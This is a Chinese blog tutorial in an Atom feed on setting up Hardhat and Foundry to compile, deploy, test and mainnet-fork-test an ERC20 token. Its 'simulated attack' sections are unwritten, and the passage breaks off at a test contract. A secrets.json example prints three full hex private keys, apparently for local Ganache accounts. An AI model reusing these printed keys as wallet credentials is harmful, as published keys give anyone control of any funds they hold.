<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.7">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-12-01T17:45:51+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Rookie Hacker</title><subtitle>Cyber Security</subtitle><author><name>true</name></author><entry><title type="html">hardhat&amp;amp;foundry</title><link href="http://localhost:4000/2022/11/25/Hardhat.html" rel="alternate" type="text/html" title="hardhat&amp;amp;foundry" /><published>2022-11-25T17:16:00+08:00</published><updated>2022-11-25T17:16:00+08:00</updated><id>http://localhost:4000/2022/11/25/Hardhat</id><content type="html" xml:base="http://localhost:4000/2022/11/25/Hardhat.html"><![CDATA[<h3 id="hardhatfoundry自动化合约部署与测试模拟攻击">hardhat&amp;foundry自动化合约部署与测试，模拟攻击</h3>

<p>[TOC]</p>

<p>thanks by Frank &amp; Deft(beosin security team)</p>

<h4 id="基础环境">基础环境</h4>
<p>当前实验环境<br />
  windows 10<br />
  Node.js 16.14.0<br />
以空文件夹中加入某ERC20示例代币为例，目录结构(contracts不要命名错误)<br />
  testhardhat<br />
    contracts<br />
      ERC20.sol</p>

<h4 id="创建hardhat项目">创建hardhat项目</h4>
<p>位于testhardhat文件下使用Powershell命令初始化</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">npm</span> <span class="nx">init</span> <span class="o">-</span><span class="nx">y</span>
</code></pre></div></div>
<p>此时会生成package.json，接下来安装Hardhat，这个过程可能会需要耗费些许时间</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">npm</span> <span class="nx">install</span> <span class="nx">hardhat</span>
</code></pre></div></div>
<p>安装结束之后创建项目，官方推荐npx的使用在项目中进行，因为可以根据项目版本进行合理控制。</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">npx</span> <span class="nx">hardhat</span>
</code></pre></div></div>
<p>选择Create an empty hardhat.config.js运行后则会在项目目录中创建一个Hardhat配置文件（hardhat.config.js）</p>
<ul>
<li style="list-style-type: none;">
    <p><img src="http://localhost:4000/screenshot/20221121hardhat/1.png" alt="1" /></p>
  </li>
</ul>

<p>Hardhat项目创建完毕后，可以安装Ethers plugin，为了简化交互</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>npm install @nomiclabs/hardhat-ethers ethers
npm install @nomiclabs/hardhat-waffle
</code></pre></div></div>

<p>为了配置与布局方便，手动添加一个secrets.json文件，用于保存私钥,以ganacha为例，这里配置的是ganache的账户私钥</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span>
    <span class="dl">"</span><span class="s2">privateKey0</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">c02541627e8811d4038e2aa96dc613fa6ae2372b993da27ddeb3955b948aad21</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">privateKey1</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">3b9dcc325007c1c616b4b06033a9013a599fdaaa7e770e0f656f7d0710436615</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">privateKey2</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">d45e2033d7214c170311872625c8b47d87d699e538cd7c7da9abf83d7b76151b</span><span class="dl">"</span>
<span class="p">}</span>
</code></pre></div></div>

<p>接下来就可以修改hardhat.config.js文件,此文件中默认为下面代码，而实际上需要根据情况修改solidity的版本,当前测试代币合约为大于0.5.0</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/** @type import('hardhat/config').HardhatUserConfig */</span>
<span class="nx">module</span><span class="p">.</span><span class="nx">exports</span> <span class="o">=</span> <span class="p">{</span>
  <span class="na">solidity</span><span class="p">:</span> <span class="dl">"</span><span class="s2">0.8.17</span><span class="dl">"</span><span class="p">,</span>
<span class="p">};</span>
</code></pre></div></div>

<p>通过require导入插件与私钥配置文件</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Import the Ethers plugin required to interact with the contract</span>
<span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">@nomiclabs/hardhat-ethers</span><span class="dl">'</span><span class="p">);</span>

<span class="c1">// Key config path</span>
<span class="kd">const</span> <span class="p">{</span> <span class="nx">privateKey0</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">./secrets.json</span><span class="dl">'</span><span class="p">);</span>

<span class="cm">/** @type import('hardhat/config').HardhatUserConfig */</span>
<span class="nx">module</span><span class="p">.</span><span class="nx">exports</span> <span class="o">=</span> <span class="p">{</span>
  <span class="na">solidity</span><span class="p">:</span> <span class="dl">"</span><span class="s2">0.5.17</span><span class="dl">"</span><span class="p">,</span>
<span class="p">};</span>
</code></pre></div></div>

<p>接下来是添加配置代码，使用的网络。</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">networks</span><span class="p">:{</span>
    <span class="c1">// testnet</span>
    <span class="nl">testnet</span><span class="p">:</span> <span class="p">{</span> <span class="c1">//任意的链网络的rpc地址，</span>
      <span class="na">url</span><span class="p">:</span> <span class="s2">`https://rpc.testnet.fantom.network/`</span><span class="p">,</span>
      <span class="na">chainId</span><span class="p">:</span> <span class="mi">4002</span><span class="p">,</span> <span class="c1">//chainID</span>
      <span class="na">accounts</span><span class="p">:</span> <span class="p">[</span><span class="nx">privateKey0</span><span class="p">],</span> <span class="c1">//私钥配置文件中的私钥0</span>
      <span class="na">gas</span><span class="p">:</span><span class="mi">8000000</span>
    <span class="p">},</span>

    <span class="nx">local_network</span><span class="p">:{</span>
    <span class="nl">url</span><span class="p">:</span> <span class="s2">`HTTP://127.0.0.1:7545`</span><span class="p">,</span>
    <span class="nx">accounts</span><span class="p">:</span> <span class="p">[</span><span class="nx">privateKey0</span><span class="p">],</span>
    <span class="nx">gas</span><span class="p">:</span><span class="mi">6721975000</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>最终代码为</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Import the Ethers plugin required to interact with the contract</span>
<span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">@nomiclabs/hardhat-ethers</span><span class="dl">'</span><span class="p">);</span>

<span class="c1">// Key config path</span>
<span class="kd">const</span> <span class="p">{</span> <span class="nx">privateKey0</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">./secrets.json</span><span class="dl">'</span><span class="p">);</span>

<span class="cm">/** @type import('hardhat/config').HardhatUserConfig */</span>
<span class="nx">module</span><span class="p">.</span><span class="nx">exports</span> <span class="o">=</span> <span class="p">{</span>
  <span class="na">solidity</span><span class="p">:</span> <span class="p">{</span><span class="na">compilers</span><span class="p">:[{</span><span class="na">version</span><span class="p">:</span><span class="dl">"</span><span class="s2">0.5.17</span><span class="dl">"</span><span class="p">,</span><span class="na">settings</span><span class="p">:{</span>
    <span class="na">optimizer</span><span class="p">:</span> <span class="p">{</span>
      <span class="na">enabled</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span>
      <span class="na">runs</span><span class="p">:</span> <span class="mi">1000</span>
    <span class="p">}</span>
  <span class="p">}}]},</span>

  <span class="na">networks</span><span class="p">:</span> <span class="p">{</span>
    <span class="c1">// testnet</span>
    <span class="na">testnet</span><span class="p">:</span> <span class="p">{</span> <span class="c1">//任意的链网络的rpc地址，</span>
      <span class="na">url</span><span class="p">:</span> <span class="s2">`https://rpc.testnet.fantom.network/`</span><span class="p">,</span>
      <span class="na">chainId</span><span class="p">:</span> <span class="mi">4002</span><span class="p">,</span> <span class="c1">//chainID</span>
      <span class="na">accounts</span><span class="p">:</span> <span class="p">[</span><span class="nx">privateKey0</span><span class="p">],</span> <span class="c1">//私钥配置文件中的私钥0</span>
      <span class="na">gas</span><span class="p">:</span><span class="mi">8000000</span>
    <span class="p">},</span>
  
    <span class="na">local_network</span><span class="p">:{</span>
    <span class="na">url</span><span class="p">:</span> <span class="s2">`HTTP://127.0.0.1:8545`</span><span class="p">,</span> <span class="c1">//这里配置为默认ganacha地址</span>
    <span class="na">accounts</span><span class="p">:</span> <span class="p">[</span><span class="nx">privateKey0</span><span class="p">],</span>
    <span class="na">gas</span><span class="p">:</span><span class="mi">6721975000</span> <span class="c1">//每笔交易的上限，即默认的gaslimt</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">};</span>
</code></pre></div></div>

<h4 id="部署代码">部署代码</h4>
<p>上面的代码写好之后，可以先进行编译检查是否有错误，包是否配置完毕。successfully则表示编译完成，会生成artifacts与cache文件夹</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">npx</span> <span class="nx">hardhat</span> <span class="nx">compile</span>
</code></pre></div></div>

<p>接下来为方便布局使用创建./scripts/deploy.js，以如下代码布局进行合约部署</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="p">{</span> <span class="nx">ethers</span>  <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">hardhat</span><span class="dl">"</span><span class="p">);</span>
<span class="kd">const</span> <span class="p">{</span> <span class="nx">privateKey0</span><span class="p">,</span> <span class="nx">privateKey1</span> <span class="p">,</span> <span class="nx">privateKey2</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">../secrets.json</span><span class="dl">'</span><span class="p">);</span>

<span class="c1">// 全局定义钱包实例</span>
<span class="kd">const</span> <span class="nx">url</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">HTTP://127.0.0.1:8545</span><span class="dl">'</span><span class="p">;</span>
<span class="kd">const</span> <span class="nx">Provider</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ethers</span><span class="p">.</span><span class="nx">providers</span><span class="p">.</span><span class="nx">JsonRpcProvider</span><span class="p">(</span><span class="nx">url</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">owner</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ethers</span><span class="p">.</span><span class="nx">Wallet</span><span class="p">(</span><span class="nx">privateKey0</span><span class="p">,</span> <span class="nx">Provider</span><span class="p">)</span>
<span class="kd">const</span> <span class="nx">wallet1</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ethers</span><span class="p">.</span><span class="nx">Wallet</span><span class="p">(</span><span class="nx">privateKey1</span><span class="p">,</span> <span class="nx">Provider</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">wallet2</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ethers</span><span class="p">.</span><span class="nx">Wallet</span><span class="p">(</span><span class="nx">privateKey2</span><span class="p">,</span> <span class="nx">Provider</span><span class="p">);</span>

<span class="c1">//部署函数</span>
<span class="k">async</span> <span class="kd">function</span> <span class="nx">Deploy</span><span class="p">()</span> <span class="p">{</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span>
        <span class="dl">"</span><span class="s2">Deploy Complete !</span><span class="dl">"</span>
    <span class="p">);</span>
<span class="p">}</span>

<span class="c1">//模拟主入口</span>
<span class="k">async</span> <span class="kd">function</span> <span class="nx">main</span><span class="p">(){</span>
    <span class="nx">Deploy</span><span class="p">();</span>
<span class="p">}</span>

<span class="c1">// try catch for err</span>
<span class="nx">main</span><span class="p">().</span><span class="k">catch</span><span class="p">((</span><span class="nx">error</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="nx">error</span><span class="p">);</span>
    <span class="nx">process</span><span class="p">.</span><span class="nx">exitCode</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
<span class="p">});</span>
</code></pre></div></div>

<p>目前我们除了在console中打印日志没有对合约进行任何操作，使用下面的命令，指定配置的本地网络进行测试</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>npx hardhat run --network local_network scripts/deploy.js
</code></pre></div></div>
<p>如果没有报错则可以看到控制台打印”Deploy Complete !” (如果报const error/Error: could not detect network检查config中网络是否配置错误)</p>

<h4 id="合约交互">合约交互</h4>

<p>部署合约并打印合约地址</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//部署函数</span>
<span class="k">async</span> <span class="kd">function</span> <span class="nx">Deploy</span><span class="p">()</span> <span class="p">{</span>
    <span class="c1">//参数为要部署的合约名称，ERC20中代币主合约命OLPC所以这里使用这个名字。</span>
    <span class="kd">const</span> <span class="nx">OLPC</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">ethers</span><span class="p">.</span><span class="nx">getContractFactory</span><span class="p">(</span><span class="dl">"</span><span class="s2">OLPC</span><span class="dl">"</span><span class="p">);</span>
    <span class="kd">const</span> <span class="nx">olpc</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">OLPC</span><span class="p">.</span><span class="nx">deploy</span><span class="p">();</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">Deploying OPLC...</span><span class="dl">'</span><span class="p">);</span>
    <span class="c1">//等等合约部署完成</span>
    <span class="k">await</span> <span class="nx">olpc</span><span class="p">.</span><span class="nx">deployed</span><span class="p">();</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">OLPC address in:  </span><span class="dl">'</span><span class="p">,</span><span class="nx">olpc</span><span class="p">.</span><span class="nx">address</span><span class="p">)</span>

    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span>
        <span class="dl">"</span><span class="s2">Deploy Complete !</span><span class="dl">"</span>
    <span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>部署中如果有参数需要填写也可以直接加入参数，比如</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">PancakeRouter</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">pancakeRouter</span><span class="p">.</span><span class="nx">deploy</span><span class="p">(</span><span class="nx">MdexFactory</span><span class="p">.</span><span class="nx">address</span><span class="p">,</span> <span class="nx">WETH</span><span class="p">.</span><span class="nx">address</span><span class="p">);</span>
</code></pre></div></div>
<p>也可以调用合约函数，比如获得uniswap部署时的initcodehash</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//部分代码</span>
<span class="kd">const</span> <span class="nx">mdexFactory</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">ethers</span><span class="p">.</span><span class="nx">getContractFactory</span><span class="p">(</span><span class="dl">"</span><span class="s2">MdexFactory</span><span class="dl">"</span><span class="p">);</span>
<span class="p">...</span>
<span class="kd">const</span> <span class="nx">MdexFactory</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">mdexFactory</span><span class="p">.</span><span class="nx">deploy</span><span class="p">(</span><span class="nx">wallet2</span><span class="p">.</span><span class="nx">address</span><span class="p">);</span>
<span class="p">...</span>
<span class="kd">const</span> <span class="nx">initCodeHash</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">MdexFactory</span><span class="p">.</span><span class="nx">getInitCodeHash</span><span class="p">();</span>
<span class="p">...</span>
<span class="k">await</span> <span class="nx">MdexFactory</span><span class="p">.</span><span class="nx">connect</span><span class="p">(</span><span class="nx">wallet2</span><span class="p">).</span><span class="nx">setInitCodeHash</span><span class="p">(</span><span class="nx">initCodeHash</span><span class="p">);</span>
</code></pre></div></div>

<p>如果对于已经部署或者需要初始化的函数则可以直接调用，例如直接调用launchPool初始化</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">await</span> <span class="nx">poolFactory</span><span class="p">.</span><span class="nx">deployed</span><span class="p">();</span>
<span class="k">await</span> <span class="nx">poolFactory</span><span class="p">.</span><span class="nx">launchPool</span><span class="p">(</span>
  <span class="mi">10</span><span class="p">,</span><span class="mi">1669015872</span><span class="p">,</span><span class="mi">1669019472</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">1000000</span><span class="p">,</span>
  <span class="nx">owner</span><span class="p">.</span><span class="nx">address</span><span class="p">,</span><span class="nx">bUSD</span><span class="p">.</span><span class="nx">address</span>
<span class="p">);</span>
</code></pre></div></div>

<p>当遇见部署或者调用测试脚本时可能遇见不明确的调试信息，这个时候可以尝试直接使用run或者直接调用脚本不指定网络，可能会给出比较正确的报错信息,例如报错数据类型未指定但 又正确声明后的情况。</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">npx</span> <span class="nx">hardhat</span> <span class="nx">run</span> <span class="c1">// npx hardhat run scripts/deploy.js</span>
</code></pre></div></div>

<h4 id="使用hardhat编写测试脚本">使用hardhat编写测试脚本</h4>
<p>为布局创建并使用 ./test/test.js，实际生产中可能也会由ts编写
需要npm安装chai，这是一个断言库文件，安全完毕后可以简单写一个测试文件对刚刚部署的代币进行测试。</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//这是一个断言库</span>
<span class="kd">const</span> <span class="p">{</span> <span class="nx">expect</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">chai</span><span class="dl">"</span><span class="p">);</span>

<span class="c1">//名称</span>
<span class="nx">describe</span><span class="p">(</span><span class="dl">"</span><span class="s2">OLPC</span><span class="dl">"</span><span class="p">,</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
    <span class="c1">//初始化2个账户地址</span>
    <span class="k">async</span> <span class="kd">function</span> <span class="nx">deploy</span><span class="p">()</span> <span class="p">{</span>
        <span class="kd">const</span> <span class="p">[</span><span class="nx">owner</span><span class="p">,</span> <span class="nx">otherAccount</span><span class="p">]</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">ethers</span><span class="p">.</span><span class="nx">getSigners</span><span class="p">();</span>
        <span class="kd">const</span> <span class="nx">OLPC</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">ethers</span><span class="p">.</span><span class="nx">getContractFactory</span><span class="p">(</span><span class="dl">"</span><span class="s2">OLPC</span><span class="dl">"</span><span class="p">);</span>
        <span class="kd">const</span> <span class="nx">oplc</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">OLPC</span><span class="p">.</span><span class="nx">deploy</span><span class="p">();</span>
        <span class="k">await</span> <span class="nx">oplc</span><span class="p">.</span><span class="nx">deployed</span><span class="p">();</span>
        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">owner:  </span><span class="dl">"</span><span class="p">,</span><span class="nx">owner</span><span class="p">.</span><span class="nx">address</span><span class="p">);</span>
        <span class="c1">//返回合约，owner方便其他函数调用</span>
        <span class="k">return</span><span class="p">{</span> <span class="nx">oplc</span><span class="p">,</span> <span class="nx">owner</span><span class="p">,</span> <span class="nx">otherAccount</span><span class="p">}</span>
    <span class="p">}</span>

    <span class="nx">it</span><span class="p">(</span><span class="dl">"</span><span class="s2">Should set the right owner</span><span class="dl">"</span><span class="p">,</span> <span class="k">async</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
        <span class="kd">const</span> <span class="p">{</span> <span class="nx">oplc</span><span class="p">,</span> <span class="nx">owner</span><span class="p">,</span> <span class="nx">otherAccount</span> <span class="p">}</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">deploy</span><span class="p">();</span>
        <span class="c1">//调用合约中的已有函数</span>
        <span class="kd">const</span> <span class="nx">balance</span> <span class="o">=</span> <span class="nx">oplc</span><span class="p">.</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">owner</span><span class="p">.</span><span class="nx">address</span><span class="p">);</span>
        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">owner balance: </span><span class="dl">"</span><span class="p">,</span> <span class="nx">balance</span><span class="p">);</span> 
        <span class="c1">//判断预铸到owner账户是否成功</span>
        <span class="nx">expect</span><span class="p">(</span><span class="k">await</span> <span class="nx">balance</span><span class="p">).</span><span class="nx">to</span><span class="p">.</span><span class="nx">equal</span><span class="p">(</span><span class="mi">5130000</span> <span class="o">*</span> <span class="p">(</span><span class="mi">10</span> <span class="o">**</span> <span class="mi">6</span><span class="p">));</span>
        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">right!</span><span class="dl">"</span><span class="p">);</span>
    <span class="p">});</span>
<span class="p">});</span>
</code></pre></div></div>
<p>确保使用的命令为</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">npx</span> <span class="nx">hardhat</span> <span class="nx">test</span>
</code></pre></div></div>
<ul>
<li style="list-style-type: none;">
    <p><img src="http://localhost:4000/screenshot/20221121hardhat/2.png" alt="2" /></p>
  </li>
</ul>

<h4 id="在合约中使用consolelog获取信息">在合约中使用console.log获取信息</h4>
<p>首先需要在合约中导入文件</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.5</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>

<span class="k">import</span> <span class="dl">"</span><span class="s2">hardhat/console.sol</span><span class="dl">"</span><span class="p">;</span>
</code></pre></div></div>
<p>接下来在需要使用的函数中加入console.log</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">balanceOf</span><span class="p">(</span><span class="nx">address</span> <span class="nx">account</span><span class="p">)</span> <span class="kr">public</span> <span class="nx">view</span> <span class="nx">returns</span> <span class="p">(</span><span class="nx">uint256</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Sender balance is %s tokens</span><span class="dl">"</span><span class="p">,</span> <span class="nx">_balances</span><span class="p">[</span><span class="nx">account</span><span class="p">]);</span>
    <span class="k">return</span> <span class="nx">_balances</span><span class="p">[</span><span class="nx">account</span><span class="p">];</span>
<span class="p">}</span>
</code></pre></div></div>
<ul>
<li style="list-style-type: none;">
    <p><img src="http://localhost:4000/screenshot/20221121hardhat/3.png" alt="3" /></p>
  </li>
</ul>

<h4 id="hardhat-fork链状态">hardhat fork链状态</h4>

<p>启动一个Fork主网的Hardhat Network实例，本地测试复杂的交互,需要启动一个节点来完成，官方推荐Alchemy<br />
<a href="https://learnblockchain.cn/docs/hardhat/guides/mainnet-forking.html">https://learnblockchain.cn/docs/hardhat/guides/mainnet-forking.html</a></p>

<p>拉取节点进行测试</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">npx</span> <span class="nx">hardhat</span> <span class="nx">node</span> <span class="o">--</span><span class="nx">fork</span> <span class="nx">https</span><span class="p">:</span><span class="c1">//eth-mainnet.alchemyapi.io/v2/&lt;key&gt;</span>
</code></pre></div></div>

<p>也可以使用–fork-block-number指定区块</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">npx</span> <span class="nx">hardhat</span> <span class="nx">node</span> <span class="o">--</span><span class="nx">fork</span> <span class="nx">https</span><span class="p">:</span><span class="c1">//eth-goerli.g.alchemy.com/v2/w-pIbpU...tZuzRC9 --fork-block-number 7974072</span>
</code></pre></div></div>

<p>或者使用配置文件fork某个区块上的网络状态，如果不写区块会默认拉取最新的</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="c1">//fork goerli test 固定写法，内置定义，hardhat testnet loacl_network，不能自定义。</span>
    <span class="nx">hardhat</span><span class="p">:</span> <span class="p">{</span>
      <span class="nl">forking</span><span class="p">:</span> <span class="p">{</span>
        <span class="na">url</span><span class="p">:</span> <span class="dl">"</span><span class="s2">https://eth-goerli.g.alchemy.com/v2/w-pIbpUV...tZuzRC9</span><span class="dl">"</span><span class="p">,</span>
        <span class="na">blockNumber</span><span class="p">:</span> <span class="mi">7974072</span>
      <span class="p">}</span>
    <span class="p">}</span>
</code></pre></div></div>

<p>直接使用命令会默认使用配置的网络，默认会使用8545，需要关闭Ganacha</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">npx</span> <span class="nx">hardhat</span> <span class="nx">node</span>
</code></pre></div></div>
<ul>
<li style="list-style-type: none;">
    <p><img src="http://localhost:4000/screenshot/20221121hardhat/4.png" alt="4" /></p>
  </li>
</ul>

<p>此时在调用测试脚本时则会使用fork网络</p>

<ul>
<li style="list-style-type: none;">
    <p><img src="http://localhost:4000/screenshot/20221121hardhat/5.png" alt="5" /></p>
  </li>
</ul>

<p>在test文件夹下不同的js测试脚本可以指定不同的fork状态，或者重置，params传递空参数则可以禁用</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">await</span> <span class="nx">network</span><span class="p">.</span><span class="nx">provider</span><span class="p">.</span><span class="nx">request</span><span class="p">({</span>
  <span class="na">method</span><span class="p">:</span> <span class="dl">"</span><span class="s2">hardhat_reset</span><span class="dl">"</span><span class="p">,</span>
  <span class="na">params</span><span class="p">:</span> <span class="p">[{</span>
    <span class="na">forking</span><span class="p">:</span> <span class="p">{</span>
      <span class="na">jsonRpcUrl</span><span class="p">:</span> <span class="dl">"</span><span class="s2">https://eth-mainnet.alchemyapi.io/v2/&lt;key&gt;</span><span class="dl">"</span><span class="p">,</span>
      <span class="na">blockNumber</span><span class="p">:</span> <span class="mi">11095000</span>
    <span class="p">}</span>
  <span class="p">}]</span>
<span class="p">})</span>
</code></pre></div></div>

<h4 id="yarn-相关使用">yarn 相关使用</h4>

<p>(待更新)</p>

<h4 id="hardhat-模拟攻击">hardhat 模拟攻击</h4>

<p>(待更新)
目前来看因为学习成本等原因，使用hardhat来完成不太合适，一方面是语言，一方面写起来非常麻烦，暂时研究foundry</p>

<h4 id="foundry-基本环境">foundry 基本环境</h4>

<p>使用foundry需要foundry环境，并且需要rust支持,跟进此处<a href="https://book.getfoundry.sh/getting-started/installation">instructions</a>按照必要的环境</p>

<p>在控制台安装好之后，在项目中运行，这可能会发花费较长的时间</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cargo install --git https://github.com/foundry-rs/foundry foundry-cli anvil --bins --locked
</code></pre></div></div>

<p>(待更新)</p>

<h4 id="用代币来熟悉foundry基本操作">用代币来熟悉foundry基本操作</h4>

<p><a href="https://cloud.tencent.com/developer/article/2010589">方法来源引用链接</a></p>

<p>创建空模板，这一步可能会因为网络或者各种原因各种报错，只能多次安装或者更新。</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>forge init
</code></pre></div></div>
<p>下载OpenZeppelin包并且更新std库</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>forge install OpenZeppelin/openzeppelin-contracts@v4.5.0
forge update foundry-rs/forge-std
</code></pre></div></div>

<p>由于安装多次失败，使用参考文章中的模板进行初始化。</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>forge init --template https://github.com/soliditylabs/forge-erc20-template
</code></pre></div></div>

<p>关于配置文件</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Additional configuration and default values at https://github.com/gakonst/foundry/tree/master/config
[default]

# Sets the concrete solc version to use
# This overrides the `auto_detect_solc` / value auto_detect_solc = true
# 这里是注释了的，可以指定solidity的版本
# solc_version = '0.8.13'

# 指定配置项目的路径，这里是lib/forge-std和openzeppelin
remappings = [
  "ds/=lib/ds-test/src/",
  "@std=lib/forge-std/src/",
  "@openzeppelin=lib/openzeppelin-contracts/contracts/",
]

[ci]
fuzz_runs = 2_000

# 资料夹
# src = 'src'
# 測試檔資料夾
# test = 'test'
# Artifact 資料夾
# out = 'out'

# RPC url。注意如果有提供這個 url，測試會默認你是要用 fork network 執行測試 #eth_rpc_url = 'https://eth-mainnet.alchemyapi.io/v2/API_KEY'
</code></pre></div></div>

<p>基本代币</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="mf">0.8</span><span class="p">.</span><span class="mi">13</span><span class="p">;</span>

<span class="k">import</span> <span class="p">{</span><span class="nx">ERC20</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">openzeppelin-contracts/token/ERC20/ERC20.sol</span><span class="dl">"</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">MyERC20</span> <span class="nx">is</span> <span class="nx">ERC20</span> <span class="p">{</span>
    <span class="kd">constructor</span><span class="p">()</span> <span class="nx">ERC20</span><span class="p">(</span><span class="dl">"</span><span class="s2">Name</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">SYM</span><span class="dl">"</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">this</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>测试合约,根据我写的注释来看具体作用</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT</span>
